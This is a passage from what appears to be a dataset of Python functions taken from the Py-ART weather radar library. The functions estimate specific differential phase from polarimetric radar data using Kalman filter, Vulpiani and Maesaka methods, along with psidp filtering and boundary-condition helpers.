    f_transposed : 4x4 float array
        Transpose of F.
    h_plus : 4x3 float array*np.nan
        Measurement prediction matrix [4x3].
    c1, c2, b1, b2 : floats
        The values of the intercept of the relation c = b*Kdp - delta.
        This relation uses b1, c1 IF kdp is lower than a kdp_th and b2, c2
        otherwise kdp_th.

    Returns
    -------
    kdp : ndarray
        Filtered Kdp [degrees/km]. Same length as Psidp.
    phidp : ndarray
        Estimated phidp (smooth psidp).
    error_kdp : ndarray
        Estimated error on Kdp values.

    """"""
    psidp = np.ma.filled(psidp_in)
    nrg_new = len(psidp)
    s = np.zeros([4, 1])
    z = np.zeros([3, 1])
    identity_i = np.eye(4)
    p = identity_i * 4.0
    phidp = np.zeros([nrg_new])
    kdp = np.zeros([nrg_new])
    kdp_error = np.zeros([nrg_new])
    for ii in range(0, nrg_new - 1):
        z[0] = psidp[ii]
        z[1] = psidp[ii + 1]
        s_pred = np.dot(f, s)
        p_pred = np.dot(f, np.dot(p, f_transposed)) + pcov_scale
        if s_pred[0] > kdp_th:
            h_plus[2, 0] = b2
            z[2] = c2
        else:
            h_plus[2, 0] = b1
            z[2] = c1
        aludc = np.dot(h_plus, np.dot(p_pred, h_plus.T)) + rcov
        b_mat = np.dot(h_plus, p_pred)
        cho = linalg.cho_factor(aludc)
        k = linalg.cho_solve(cho, b_mat, check_finite=False, overwrite_b=True).T
        s = np.dot(k, np.dot(-h_plus, s_pred) + z) + s_pred
        p = np.dot(identity_i - np.dot(k, h_plus), p_pred)
        kdp[ii] = s[0]
        kdp_error[ii] = p[0, 0]
        phidp[ii] = s[2]
    dummy = np.copy(kdp)
    kdp[np.arange(SHIFT) + len(kdp) - SHIFT] = 0
    kdp[np.arange(len(kdp) - SHIFT)] = dummy[np.arange(len(kdp) - SHIFT) + SHIFT]
    return (kdp, phidp, kdp_error)"
ARM-DOE/pyart,_kdp_kalman_profile,"def _kdp_kalman_profile(psidp_in, dr, band='X', rcov=0, pcov=0):
    """"""
    Estimates Kdp with the Kalman filter method by Schneebeli and al. (2014)
    for a set of psidp measurements.

    Parameters
    ----------
    psidp_in : ndarray
        One-dimensional vector of length -nrg- containining the input psidp
        [degrees].
    dr : float
        Range resolution in meters.
    band : char, optional
       Radar frequency band string. Accepted ""X"", ""C"", ""S"" (capital
       or not). The band is used to compute intercepts -c and slope b of the
       delta = b*Kdp+c relation.
    rcov : 3x3 float array, optional
        Measurement error covariance matrix.
    pcov  : 4x4 float array, optional
        Scaled state transition error covariance matrix.

    Returns
    -------
    kdp_dict : ndarray
        Retrieved specific differential phase data.
    kdp_std_dict : ndarray
        Estimated specific differential phase standard dev. data.
    phidpr_dict : ndarray
        Retrieved differential phase data.

    References
    ----------
    Schneebeli, M., Grazioli, J., and Berne, A.: Improved Estimation
    of the Specific Differential Phase Shift Using a Compilation of
    Kalman Filter Ensembles, IEEE T. Geosci. Remote Sens., 52,
    5137-5149, doi:10.1109/TGRS.2013.2287017, 2014.

    """"""
    dr = dr / 1000.0
    psidp_in = np.ma.filled(psidp_in, np.nan)
    if not np.isfinite(psidp_in).any():
        return (psidp_in, psidp_in, psidp_in)
    if not isinstance(pcov, np.ndarray):
        pcov = np.array([[(0.11 + 1.56 * dr) ** 2, (0.11 + 1.85 * dr) ** 2, 0, (0.01 + 1.1 * dr) ** 2], [(0.11 + 1.85 * dr) ** 2, (0.18 + 3.03 * dr) ** 2, 0, (0.01 + 1.23 * dr) ** 2], [0, 0, 0, 0], [(0.01 + 1.1 * dr) ** 2, (0.01 + 1.23 * dr) ** 2, 0, (-0.04 + 1.27 * dr) ** 2]])
    if not isinstance(rcov, np.ndarray):
        rcov = np.array([[4.10625, -0.0498779, -0.0634192], [-0.0498779, 4.02369, -0.0421455], [-0.0634192, -0.0421455, 1.443]])
    if band == 'X':
        c1 = -0.054
        c2 = -6.155
        b1 = 2.3688
        b2 = 0.2734
        kdp_th = 2.5
    elif band == 'C':
        c1 = -0.036
        c2 = -1.03
        b1 = 0.53
        b2 = 0.15
        kdp_th = 2.5
    elif band == 'S':
        c1 = -0.024
        c2 = -0.15
        b1 = 0.19
        b2 = 0.019
        kdp_th = 1.1
    fac1 = 1.2
    fac2 = 3.0
    th1_comp = -0.15
    th2_comp = 0.15
    th1_final = -0.25
    f = np.array([[1, 0, 0, 0], [0, 1, 0, 0], [0, 0, 0, 1], [2 * dr, 0, 0, 1]], dtype=float)
    f_transposed = f.T
    h_plus = np.array([[-2 * dr, 1, 0, 1], [2 * dr, 1, 1, 0], [0, -1, 0, 0]], dtype=float)
    psidp = psidp_in
    real_data_ind = np.where(np.isfinite(psidp.ravel()))[0]
    offset = real_data_ind[0]
    if len(real_data_ind):
        mpsidp = psidp.ravel()[real_data_ind[-1]]
    else:
        mpsidp = np.nan
    psidp = psidp[offset:real_data_ind[-1] + 1]
    nrg = len(psidp)
    kdp_filter_out = np.zeros([nrg])
    kdp_mat = np.zeros([nrg, 2 * len(SCALERS)])
    kdp_sim = np.zeros([nrg, len(SCALERS)])
    phidp_filter_out = np.zeros([nrg])
    psidp_long = np.zeros([nrg + PADDING * 2]) * np.nan
    nn = nrg + PADDING * 2
    noise = 2 * np.random.randn(PADDING)
    psidp_long[0:PADDING] = noise + psidp[0]
    psidp_long[nrg + PADDING:nrg + 2 * PADDING] = mpsidp + noise
    psidp_long[PADDING:nrg + PADDING] = psidp
    psidp = psidp_long
    nonan = np.where(np.isfinite(psidp))[0]
    nan = np.where(np.isnan(psidp))[0]
    ranged = np.arange(0, nn)
    psidp_interp = psidp
    if len(nan):
        interp = interpolate.interp1d(ranged[nonan], psidp[nonan], kind='zero')
        psidp_interp[nan] = interp(ranged[nan])
    else:
        psidp_interp = psidp
    if len(nan):
        psidp_interp[nan] = psidp_interp[nan] + 2 * np.random.randn(len(nan))
    psidp = psidp_interp
    scaler = 10 ** (-2.0)
    (kdp_dummy_b2, _) = _kdp_estimation_backward_fixed(psidp, rcov, pcov * scaler, f, f_transposed, h_plus, c1, c2, b1, b2, kdp_th, mpsidp)
    kdp002 = kdp_dummy_b2[PADDING:nrg + PADDING]
    (kdp_dummy_b2, _, _) = _kdp_estimation_forward_fixed(psidp, rcov, pcov * scaler, f, f_transposed, h_plus, c1, c2, b1, b2, kdp_th)
    kdp002f = kdp_dummy_b2[PADDING:nrg + PADDING]
    for (i, sc) in enumerate(SCALERS):
        (kdp_dummy_f2, _, _) = _kdp_estimation_forward_fixed(psidp, rcov, pcov * sc, f, f_transposed, h_plus, c1, c2, b1, b2, kdp_th)
        kdp_mat[:, 2 * i] = kdp_dummy_f2[PADDING:nrg + PADDING]
        (kdp_dummy_b2, _) = _kdp_estimation_backward_fixed(psidp, rcov, pcov * sc, f, f_transposed, h_plus, c1, c2, b1, b2, kdp_th, mpsidp)
        kdp_mat[:, 2 * i + 1] = kdp_dummy_b2[PADDING:nrg + PADDING]
    kdp_mean = np.nanmean(kdp_mat, axis=1)
    kdp_mean_shift = np.roll(kdp_mean, -1)
    diff_mean = kdp_mean - kdp_mean_shift
    kdp_std = np.nanstd(kdp_mat, axis=1)
    if len(diff_mean) < 4:
        size_filt = len(diff_mean)
    else:
        size_filt = 4
    diff_mean_smooth = np.convolve(diff_mean, np.ones((size_filt,)) / size_filt, mode='same')
    condi = np.where(diff_mean_smooth > th2_comp)[0]
    if len(condi):
        kdp_dummy = kdp_mat[:, np.arange(len(SCALERS)) * 2 + 1]
        kdp_sim[condi, :] = kdp_dummy[condi, :]
    condi = np.where(diff_mean_smooth < th1_comp)[0]
    if len(condi):
        kdp_dummy = kdp_mat[:, np.arange(len(SCALERS)) * 2]
        kdp_sim[condi, :] = kdp_dummy[condi, :]
    condi = np.where(np.logical_and(diff_mean_smooth >= th1_comp, diff_mean_smooth <= th2_comp))[0]
    if len(condi):
        weight2 = -0.5 / 0.15 * diff_mean_smooth + 0.5
        weight2 = np.tile(weight2, (len(SCALERS), 1)).T
        kdp_dummy = (1 - weight2) * kdp_mat[:, np.arange(len(SCALERS)) * 2 + 1] + weight2 * kdp_mat[:, np.arange(len(SCALERS)) * 2]
        kdp_sim[condi, :] = kdp_dummy[condi, :]
    kdp_mean_sim = np.nanmean(kdp_sim, axis=1)
    kdp_std_sim = np.nanstd(kdp_sim, axis=1)
    kdp_low_mean2 = np.nanmean(np.vstack((kdp002, kdp002f)).T, axis=1)
    lower_bound = np.round(kdp_mean_sim * fac1) - np.round(kdp_std_sim * fac2)
    lower_bound = np.maximum(lower_bound, 0)
    lower_bound = np.minimum(lower_bound, len(SCALERS) - 1)
    upper_bound = np.round(kdp_mean_sim * fac1) + np.round(kdp_std_sim * fac2)
    upper_bound = np.maximum(upper_bound, 0)
    upper_bound = np.minimum(upper_bound, len(SCALERS) - 1)
    for uu in range(0, nrg - 1):
        selection_vector = np.arange(upper_bound[uu] - lower_bound[uu] + 1) + lower_bound[uu]
        selection_vector = selection_vector.astype(int)
        kdp_filter_out[uu] = np.mean(kdp_sim[uu, selection_vector])
    ind_lt_0 = np.where(kdp_filter_out < th1_final)[0]
    if len(ind_lt_0):
        kdp_filter_out[ind_lt_0] = kdp_low_mean2[ind_lt_0]
    phidp_filter_out = np.cumsum(kdp_filter_out) * 2.0 * dr
    phinan = np.where(np.isnan(psidp))[0]
    if len(phinan):
        phidp_filter_out[phinan] = np.nan
        kdp_filter_out[phinan] = np.nan
    phidp_filter_out[nrg - 1] = np.nan
    kdp_filter_out[nrg - 1] = np.nan
    kdp_filter_out = np.pad(kdp_filter_out, (offset, 0), mode='constant', constant_values=np.nan)
    kdp_std = np.pad(kdp_std, (offset, 0), mode='constant', constant_values=np.nan)
    phidp_filter_out = np.pad(phidp_filter_out, (offset, 0), mode='constant', constant_values=np.nan)
    return (kdp_filter_out, kdp_std, phidp_filter_out)"
ARM-DOE/pyart,kdp_vulpiani,"def kdp_vulpiani(radar, gatefilter=None, fill_value=None, psidp_field=None, kdp_field=None, phidp_field=None, band='C', windsize=10, n_iter=10, interp=False, prefilter_psidp=False, filter_opt=None, parallel=False):
    """"""
    Estimates Kdp with the Vulpiani method for a 2D array of psidp measurements
    with the first dimension being the distance from radar and the second
    dimension being the angles (azimuths for PPI, elev for RHI).The input psidp
    is assumed to be pre-filtered (for ex. with the filter_psidp function)

    Parameters
    ----------
    radar : Radar
        Radar containing differential phase field.
    gatefilter : GateFilter, optional
        A GateFilter indicating radar gates that should be excluded when
        analysing differential phase measurements.
    fill_value : float, optional
        Value indicating missing or bad data in differential phase field, if
        not specified, the default in the Py-ART configuration file will be
        used
    psidp_field : str, optional
        Total differential phase field. If None, the default field name must be
        specified in the Py-ART configuration file.
    kdp_field : str, optional
        Specific differential phase field. If None, the default field name must
        be specified in the Py-ART configuration file.
    phidp_field : str, optional
        Propagation differential phase field. If None, the default field name
        must be specified in the Py-ART configuration file.
    band : char, optional
        Radar frequency band string. Accepted ""X"", ""C"", ""S"" (capital
        or not). It is used to set default boundaries for expected
        values of Kdp.
    windsize : int, optional
        Size in # of gates of the range derivative window. Should be even.
    n_iter : int, optional
        Number of iterations of the method. Default is 10.
    interp : bool, optional
        If True, all the nans are interpolated.The advantage is that less data
        are lost (the iterations in fact are ""eating the edges"") but some
        non-linear errors may be introduced.
    prefilter_psidp : bool, optional
        If set, the psidp measurements will first be filtered with the
        filter_psidp method, which can improve the quality of the final Kdp.
    filter_opt : dict, optional
        The arguments for the prefilter_psidp method, if empty, the defaults
        arguments of this method will be used.
    parallel : bool, optional
        Flag to enable parallel computation (one core for every psidp profile).

    Returns
    -------
    kdp_dict : dict
        Retrieved specific differential phase data and metadata.
    phidpr_dict,: dict
        Retrieved differential phase data and metadata.

    References
    ----------
    Gianfranco Vulpiani, Mario Montopoli, Luca Delli Passeri, Antonio G. Gioia,
    Pietro Giordano, and Frank S. Marzano, 2012: On the Use of Dual-Polarized
    C-Band Radar for Operational Rainfall Retrieval in Mountainous Areas.
    J. Appl. Meteor. Climatol., 51, 405-425, doi: 10.1175/JAMC-D-10-05024.1.

    """"""
    if np.mod(windsize, 2):
        warnings.warn('In the Vulpiani method, the windsize should be even. ' + 'Using default value, windsize = 10')
        windsize = 10
    if parallel:
        import multiprocessing as mp
        pool = mp.Pool(processes=mp.cpu_count(), maxtasksperchild=1)
    if fill_value is None:
        fill_value = get_fillvalue()
    if psidp_field is None:
        psidp_field = get_field_name('differential_phase')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    dr = _parse_range_resolution(radar, check_uniform=True)
    if prefilter_psidp:
        if filter_opt is None:
            filter_opt = {}
        filter_opt['psidp_field'] = psidp_field
        psidp_o = filter_psidp(radar, **filter_opt)
    else:
        psidp_o = radar.fields[psidp_field]['data']
    if gatefilter is not None:
        psidp_o = np.ma.masked_where(gatefilter.gate_excluded, psidp_o)
    func = partial(_kdp_vulpiani_profile, dr=dr, windsize=windsize, band=band, n_iter=n_iter, interp=interp)
    all_psidp_prof = list(psidp_o)
    if parallel:
        list_est = pool.map(func, all_psidp_prof)
    else:
        list_est = map(func, all_psidp_prof)
    kdp = np.ma.zeros(psidp_o.shape)
    kdp[:] = np.ma.masked
    kdp.set_fill_value(fill_value)
    phidp_rec = np.ma.zeros(psidp_o.shape)
    phidp_rec[:] = np.ma.masked
    phidp_rec.set_fill_value(fill_value)
    for (i, size) in enumerate(list_est):
        kdp[i, 0:len(size[0])] = size[0]
        phidp_rec[i, 0:len(size[1])] = size[1]
    if isinstance(psidp_o, np.ma.masked_array):
        masked = psidp_o.mask
        kdp = np.ma.array(kdp, mask=masked, fill_value=fill_value)
        phidp_rec = np.ma.array(phidp_rec, mask=masked, fill_value=fill_value)
    kdp_dict = get_metadata(kdp_field)
    kdp_dict['data'] = kdp
    phidpr_dict = get_metadata(phidp_field)
    phidpr_dict['data'] = phidp_rec
    if parallel:
        pool.close()
    return (kdp_dict, phidpr_dict)"
ARM-DOE/pyart,_kdp_vulpiani_profile,"def _kdp_vulpiani_profile(psidp_in, dr, windsize=10, band='X', n_iter=10, interp=False):
    """"""
    Estimates Kdp with the Vulpiani method for a single profile of psidp
    measurements

    Parameters
    ----------
    psidp_in : ndarray
        Total differential phase measurements.
    dr : float
        Range resolution in meters.
    windsize : int, optional
        Size in # of gates of the range derivative window.
    band : char, optional
        Radar frequency band string. Accepted ""X"", ""C"", ""S"" (capital
        or not). It is used to set default boundaries for expected
        values of Kdp
    n_iter : int, optional
        Number of iterations of the method. Default is 10.
    interp : bool, optional
        If set all the nans are interpolated.The advantage is that less data
        are lost (the iterations in fact are ""eating the edges"") but some
        non-linear errors may be introduced

    Returns
    -------
    kdp_calc : ndarray
        Retrieved specific differential profile
    phidp_rec,: ndarray
        Retrieved differential phase profile

    """"""
    mask = np.ma.getmaskarray(psidp_in)
    size = windsize
    l2 = int(size / 2)
    drm = dr / 1000.0
    if mask.all() is True:
        return (psidp_in, psidp_in, psidp_in)
    if band == 'X':
        th1 = -2.0
        th2 = 40.0
        std_th = 5.0
    elif band == 'C':
        th1 = -2.0
        th2 = 20.0
        std_th = 5.0
    elif band == 'S':
        th1 = -2.0
        th2 = 14.0
        std_th = 5.0
    else:
        print('Unexpected value set for the band keyword ')
        print(band)
        return None
    psidp = psidp_in
    nn = len(psidp_in)
    valid = np.logical_not(mask)
    if interp:
        ranged = np.arange(0, nn)
        psidp_interp = psidp
        if np.ma.is_masked(psidp):
            interp = interpolate.interp1d(ranged[valid], psidp[valid], kind='zero', bounds_error=False, fill_value=np.nan)
            psidp_interp[mask] = interp(ranged[mask])
        psidp = psidp_interp
    psidp = np.ma.filled(psidp, np.nan)
    kdp_calc = np.zeros([nn])
    kdp_calc[l2:nn - l2] = (psidp[size:nn] - psidp[0:nn - size]) / (2.0 * size * drm)
    kdp_calc[0:l2] = 0.0
    kdp_calc[nn - l2:] = 0.0
    kdp_calc[kdp_calc <= th1] = 0.0
    kdp_calc[kdp_calc >= th2] = 0.0
    kdp_calc[np.isnan(kdp_calc)] = 0.0
    tex = np.ma.zeros(kdp_calc.shape)
    tex_aux = np.ma.std(rolling_window(kdp_calc, l2 * 2 + 1), -1)
    tex[l2:-l2] = tex_aux
    kdp_calc[tex > std_th] = 0.0
    for i in range(0, n_iter):
        phidp_rec = np.ma.cumsum(kdp_calc) * 2.0 * drm
        kdp_calc[l2:nn - l2] = (phidp_rec[size:nn] - phidp_rec[0:nn - size]) / (2.0 * size * drm)
        kdp_calc[0:l2] = 0.0
        kdp_calc[nn - l2:] = 0.0
        kdp_calc[kdp_calc <= th1] = 0.0
        kdp_calc[kdp_calc >= th2] = 0.0
    kdp_calc = np.ma.masked_where(mask, kdp_calc)
    phidp_rec = np.ma.cumsum(kdp_calc) * 2.0 * drm
    return (kdp_calc, phidp_rec)"
ARM-DOE/pyart,filter_psidp,"def filter_psidp(radar, psidp_field=None, rhohv_field=None, minsize_seq=5, median_filter_size=7, thresh_rhohv=0.65, max_discont=90):
    """"""
    Filter measured psidp to remove spurious data in four steps:
         1. Censor it where Rhohv is lower than threshold
         2. Unravel angles when strong discontinuities are detected
         3. Remove very short sequences of valid data
         4. Apply a median filter on every profile

    Parameters
    ----------
    radar : Radar
        Radar containing differential phase field.
    psidp_field : str, optional
        Total differential phase field. If None, the default field name must be
        specified in the Py-ART configuration file.
    rhohv_field : str, optional
        Cross correlation ratio field. If None, the default field name must
        be specified in the Py-ART configuration file.
    minsize_seq  : integer, optional
        Minimal len (in radar gates) of sequences of valid data to be accepted
    median_filter_size : integer, optional
        Size (in radar gates) of the median filter to be applied on psidp
    thresh_rhohv : float, optional
        Censoring threshold in rhohv (gates with rhohv < thresh_rhohv)
        will be rejected
    max_discont : int, optional
        Maximum discontinuity between psidp values, default is 90 deg

    Returns
    -------
    psidp_filt : ndarray
        Filtered psidp field

    """"""
    if psidp_field is None:
        psidp_field = get_field_name('differential_phase')
    if rhohv_field is None:
        rhohv_field = get_field_name('cross_correlation_ratio')
    psidp_o = radar.fields[psidp_field]['data']
    rhohv = radar.fields[rhohv_field]['data']
    if np.isscalar(psidp_o.mask):
        psidp_o.mask = np.zeros(psidp_o.shape) + psidp_o.mask
    if not isinstance(psidp_o, np.ma.masked_array):
        psidp_o = np.ma.array(psidp_o, mask=np.isnan(psidp_o))
    mask = np.ones(psidp_o.shape) * False
    mask += rhohv < thresh_rhohv
    mask += psidp_o.mask
    psidp_filt = np.zeros(psidp_o.shape)
    for (i, psi_row) in enumerate(psidp_o):
        idx = np.where(~psi_row.mask)[0]
        if len(idx):
            psi_row = psi_row[0:idx[-1] + 1]
            psi_row[~psi_row.mask] = np.rad2deg(np.unwrap(np.deg2rad(psi_row[~psi_row.mask]), np.deg2rad(max_discont)))
            psi_row_with_nan = np.ma.filled(psi_row, np.nan)
            psi_row_with_nan = np.pad(psi_row_with_nan, (1, 1), 'constant', constant_values=(np.nan,))
            idx = np.where(np.isfinite(psi_row_with_nan))[0]
            nan_left = idx[np.where(np.isnan(psi_row_with_nan[idx - 1]))[0]]
            nan_right = idx[np.where(np.isnan(psi_row_with_nan[idx + 1]))[0]]
            len_sub = nan_right - nan_left
            for (j, size) in enumerate(len_sub):
                if size < minsize_seq:
                    mask[i, nan_left[j] - 1:nan_right[j] + 1] = True
            psi_row = signal.medfilt(psi_row_with_nan, median_filter_size)
            psidp_filt[i, 0:len(psi_row[1:-1])] = psi_row[1:-1]
    psidp_filt = np.ma.masked_array(psidp_filt, mask=mask, fill_value=psidp_o.fill_value)
    return psidp_filt"
ARM-DOE/pyart,kdp_maesaka,"def kdp_maesaka(radar, gatefilter=None, method='cg', backscatter=None, Clpf=1.0, length_scale=None, first_guess=0.01, finite_order='low', fill_value=None, proc=1, psidp_field=None, kdp_field=None, phidp_field=None, debug=False, verbose=False, **kwargs):
    """"""
    Compute the specific differential phase (KDP) from corrected (e.g.,
    unfolded) total differential phase data based on the variational method
    outlined in Maesaka et al. (2012). This method assumes a monotonically
    increasing propagation differential phase (PHIDP) with increasing range
    from the radar, and therefore is limited to rainfall below the melting
    layer and/or warm clouds at weather radar frequencies (e.g., S-, C-, and
    X-band). This method currently only supports radar data with constant range
    resolution.

    Following the notation of Maesaka et al. (2012), the primary control
    variable k is proportional to KDP,

                                k**2 = 2 * KDP * dr

    which, because of the square, assumes that KDP always takes a positive
    value.

    Parameters
    ----------
    radar : Radar
        Radar containing differential phase field.
    gatefilter : GateFilter
        A GateFilter indicating radar gates that should be excluded when
        analysing differential phase measurements.
    method : str, optional
        Type of scipy.optimize method to use when minimizing the cost
        functional. The default method uses a nonlinear conjugate gradient
        algorithm. In Maesaka et al. (2012) they use the Broyden-Fletcher-
        Goldfarb-Shanno (BFGS) algorithm, however for large functional size
        (e.g., 100K+ variables) this algorithm is considerably slower than a
        conjugate gradient algorithm.
    backscatter : optional
        Define the backscatter differential phase. If None, the backscatter
        differential phase is set to zero for all range gates. Note that
        backscatter differential phase can be parameterized using attentuation
        corrected differential reflectivity.
    Clpf : float, optional
        The low-pass filter (radial smoothness) constraint weight as in
        equation (15) of Maesaka et al. (2012).
    length_scale : float, optional
        Length scale in meters used to bring the dimension and magnitude of the
        low-pass filter cost functional in line with the observation cost
        functional. If None, the length scale is set to the range resolution.
    first_guess : float, optional
        First guess for control variable k. Since k is proportional to the
        square root of KDP, the first guess should be close to zero to signify
        a KDP field close to 0 deg/km everywhere. However, the first guess
        should not be exactly zero in order to avoid convergence criteria after
        the first iteration. In fact it is recommended to use a value closer to
        one than zero.
    finite_order : 'low' or 'high', optional
        The finite difference accuracy to use when computing derivatives.
    maxiter : int, optional
        Maximum number of iterations to perform during cost functional
        minimization. The maximum number of iterations are only performed if
        convergence criteria are not met. For variational schemes such as this
        one, it is generally not recommended to try and achieve convergence
        criteria since the values of the cost functional and/or its gradient
        norm are somewhat arbitrary.
    fill_value : float, optional
        Value indicating missing or bad data in differential phase field.
    proc : int, optional
        The number of parallel threads (CPUs) to use. Currently no
        multiprocessing capability exists.
    psidp_field : str, optional
        Total differential phase field. If None, the default field name must be
        specified in the Py-ART configuration file.
    kdp_field : str, optional
        Specific differential phase field. If None, the default field name must
        be specified in the Py-ART configuration file.
    phidp_field : str, optional
        Propagation differential phase field. If None, the default field name
        must be specified in the Py-ART configuration file.
    debug : bool, optional
        True to print debugging information, False to suppress.
    verbose : bool, optional
        True to print relevant information, False to suppress.

    Returns
    -------
    kdp_dict : dict
        Retrieved specific differential phase data and metadata.
    phidpf_dict, phidpr_dict : dict
        Retrieved forward and reverse direction propagation differential phase
        data and metadata.

    References
    ----------
    Maesaka, T., Iwanami, K. and Maki, M., 2012: ""Non-negative KDP Estimation
    by Monotone Increasing PHIDP Assumption below Melting Layer"". The Seventh
    European Conference on Radar in Meteorology and Hydrology.

    """"""
    if fill_value is None:
        fill_value = get_fillvalue()
    if psidp_field is None:
        psidp_field = get_field_name('differential_phase')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    dr = _parse_range_resolution(radar, check_uniform=True, verbose=verbose)
    if length_scale is None:
        length_scale = dr
    Clpf *= length_scale ** 4
    bcs = boundary_conditions_maesaka(radar, gatefilter=gatefilter, psidp_field=psidp_field, debug=debug, verbose=verbose, **kwargs)
    (phi_near, phi_far) = bcs[:2]
    (idx_near, idx_far) = bcs[4:]
    psidp_o = radar.fields[psidp_field]['data']
    if debug:
        N = np.ma.count(psidp_o)
        print(f'Sample size before filtering: {N}')
    if gatefilter is not None:
        psidp_o = np.ma.masked_where(gatefilter.gate_excluded, psidp_o)
    for ray in range(radar.nrays):
        psidp_o[ray, :idx_near[ray]] = np.ma.masked
        psidp_o[ray, idx_far[ray] + 1:] = np.ma.masked
    if debug:
        N = np.ma.count(psidp_o)
        print(f'Sample size after filtering: {N}')
    Cobs = np.logical_not(np.ma.getmaskarray(psidp_o)).astype(psidp_o.dtype)
    psidp_o = np.ma.filled(psidp_o, fill_value)
    if backscatter is None:
        dhv = np.zeros_like(psidp_o, subok=False)
    options = {'maxiter': kwargs.get('maxiter', 50), 'gtol': kwargs.get('gtol', 1e-05), 'disp': verbose}
    if debug:
        optimize.show_options(solver='minimize', method=method)
    x0 = np.zeros_like(psidp_o, subok=False).flatten()
    x0.fill(first_guess)
    if verbose:
        print(f'Cost functional size: {x0.size}')
    args = (psidp_o, [phi_near, phi_far], dhv, dr, Cobs, Clpf, finite_order, fill_value, proc, debug, verbose)
    if debug:
        start = time.time()
    xopt = optimize.minimize(_cost_maesaka, x0, args=args, method=method, jac=_jac_maesaka, hess=None, hessp=None, bounds=None, constraints=None, callback=None, options=options)
    if debug:
        elapsed = time.time() - start
        print(f'Elapsed time for minimization: {elapsed:.0f} sec')
    k = xopt.x.reshape(psidp_o.shape)
    kdp = k ** 2 / (2.0 * dr) * 1000.0
    if debug:
        print(f'Min retrieved KDP: {kdp.min():.2f} deg/km')
        print(f'Max retrieved KDP: {kdp.max():.2f} deg/km')
        print(f'Mean retrieved KDP: {kdp.mean():.2f} deg/km')
    kdp_dict = get_metadata(kdp_field)
    kdp_dict['data'] = kdp
    kdp_dict['valid_min'] = 0.0
    kdp_dict['Clpf'] = Clpf
    (phidp_f, phidp_r) = _forward_reverse_phidp(k, [phi_near, phi_far], verbose=verbose)
    phidpf_dict = get_metadata(phidp_field)
    phidpf_dict['data'] = phidp_f
    phidpf_dict['comment'] = 'Retrieved in forward direction'
    phidpr_dict = get_metadata(phidp_field)
    phidpr_dict['data'] = phidp_r
    phidpr_dict['comment'] = 'Retrieved in reverse direction'
    return (kdp_dict, phidpf_dict, phidpr_dict)"
ARM-DOE/pyart,boundary_conditions_maesaka,"def boundary_conditions_maesaka(radar, gatefilter=None, n=20, psidp_field=None, debug=False, verbose=False, **kwargs):
    """"""
    Determine near range gate and far range gate propagation differential phase
    boundary conditions. This follows the method outlined in Maesaka et al.
    (2012), except instead of using the mean we use the median which is less
    susceptible to outliers. This function can also be used to estimate the
    system phase offset.

    Parameters
    ----------
    radar : Radar
        Radar containing total differential phase measurements.
    gatefilter : GateFilter
        A GateFilter indicating radar gates that should be excluded when
        analysing differential phase measurements.
    n : int, optional
        The number of range gates necessary to define the near and far range
        gate boundary conditions. Maesaka et al. (2012) uses a value of 30. If
        this value is too small then a spurious spike in specific differential
        phase close to the radar may be retrieved.
    check_outliers : bool, optional
        True to check for near range gate boundary condition outliers. Outliers
        near the radar are primarily the result of ground clutter returns.
    psidp_field : str, optional
        Field name of total differential phase. If None, the default field name
        must be specified in the Py-ART configuration file.
    debug : bool, optional
        True to print debugging information, False to suppress.
    verbose : bool, optional
        True to print relevant information, False to suppress.

    Returns
    -------
    phi_near : ndarray
        The near range differential phase boundary condition for each ray.
    phi_far : ndarray
        The far range differential phase boundary condition for each ray.
    range_near : ndarray
        The near range gate in meters for each ray.
    range_far : ndarray
        The far range gate in meters for each ray.
    idx_near : ndarray
        Index of nearest range gate for each ray.
    idx_far : ndarray
        Index of furthest range gate for each ray.

    """"""
    if psidp_field is None:
        psidp_field = get_field_name('differential_phase')
    psidp = radar.fields[psidp_field]['data']
    if gatefilter is not None:
        psidp = np.ma.masked_where(gatefilter.gate_excluded, psidp)
    slices = np.ma.notmasked_contiguous(psidp, axis=1)
    if debug:
        N = sum((len(slc) for slc in slices if hasattr(slc, '__len__')))
        print(f'Total number of unique non-masked regions: {N}')
    phi_near = np.zeros(radar.nrays, dtype=psidp.dtype)
    phi_far = np.zeros(radar.nrays, dtype=psidp.dtype)
    range_near = np.zeros(radar.nrays, dtype=psidp.dtype)
    range_far = np.zeros(radar.nrays, dtype=psidp.dtype)
    idx_near = np.zeros(radar.nrays, dtype=np.int32)
    idx_far = np.zeros(radar.nrays, dtype=np.int32)
    for (ray, regions) in enumerate(slices):
        if regions is None:
            continue
        if isinstance(regions, slice):
            regions = [regions]
        for slc in regions:
            if slc.stop - slc.start >= n:
                idx = slice(slc.start, slc.start + n)
                idx_near[ray] = idx.start
                range_near[ray] = radar.range['data'][idx][0]
                x = radar.range['data'][idx]
                y = psidp[ray, idx]
                slope = stats.linregress(x, y)[0]
                if slope > 0.0:
                    phi_near[ray] = y[0]
                else:
                    phi_near[ray] = np.median(y)
                break
            else:
                continue
        for slc in reversed(regions):
            if slc.stop - slc.start >= n:
                idx = slice(slc.stop - n, slc.stop)
                idx_far[ray] = idx.stop
                range_far[ray] = radar.range['data'][idx][-1]
                x = radar.range['data'][idx]
                y = psidp[ray, idx]
                slope = stats.linregress(x, y)[0]
                if slope > 0.0:
                    phi_far[ray] = y[-1]
                else:
                    phi_far[ray] = np.median(y)
                break
            else:
                continue
    phi_near_valid = phi_near[phi_near != 0.0]
    if kwargs.get('check_outliers', True) and phi_near_valid.size != 0:
        (counts, edges) = np.histogram(phi_near_valid, bins=144, range=(-360, 360), density=False)
        system_phase_peak_left = edges[counts.argmax()]
        system_phase_peak_right = edges[counts.argmax() + 1]
        if debug:
            print(f'Peak of system phase distribution: {system_phase_peak_left:.0f} deg')
        is_left_side = np.logical_and(edges[:-1] < system_phase_peak_left, counts <= 5)
        left_edge = edges[:-1][is_left_side][-1]
        is_right_side = np.logical_and(edges[1:] > system_phase_peak_right, counts <= 5)
        right_edge = edges[1:][is_right_side][0]
        if debug:
            print(f'Left edge of system phase distribution: {left_edge:.0f} deg')
            print(f'Right edge of system phase distribution: {right_edge:.0f} deg')
        is_system_phase = np.logical_or(phi_near_valid >= left_edge, phi_near_valid <= right_edge)
        system_phase_offset = np.median(phi_near_valid[is_system_phase])
        if debug:
            print(f'Estimated system phase offset: {system_phase_offset:.0f} deg')
        for (ray, bc) in enumerate(phi_near):
            if bc < left_edge or bc > right_edge:
                phi_near[ray] = system_phase_offset
    is_unphysical = phi_far - phi_near < 0.0
